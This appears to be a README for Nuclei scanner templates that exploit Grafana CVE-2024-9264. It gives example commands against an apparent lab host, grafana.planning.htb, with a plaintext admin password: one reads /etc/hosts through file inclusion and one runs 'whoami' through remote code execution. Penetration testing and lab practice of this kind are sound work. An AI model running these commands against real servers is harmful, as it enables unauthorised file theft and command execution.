# Nuclei Blues: Nuclei templates

![](/img/nuclei-blues.png)

## Grafana

### CVE-2024-9264

#### grafana-cve-2024-9264-lfi.yaml - LFI 

The `grafana-cve-2024-9264-lfi.yaml` template leverages the vulnerability to exfiltrate files from the target.

Please note that you may need to escape slashes when specifying the path of the file you want to read in the rfile variable to prevent Nuclei from trying to open the file on your system.

```sh
nuclei -u http://grafana.planning.htb -t ./grafana-cve-2024-9264-lfi.yaml -var username=admin -var password=0D5oT70Fq13EvB5r -var rfile="\/etc\/hosts"
```

##### grafana-cve-2024-9264-rce.yaml - RCE

The `grafana-cve-2024-9264-rce.yaml` template leverages the vulnerability to run commands the target.

```sh
nuclei -u http://grafana.planning.htb -t ./grafana-cve-2024-9264-rce.yaml -var username=admin -var password=0D5oT70Fq13EvB5r -var command=whoami
```
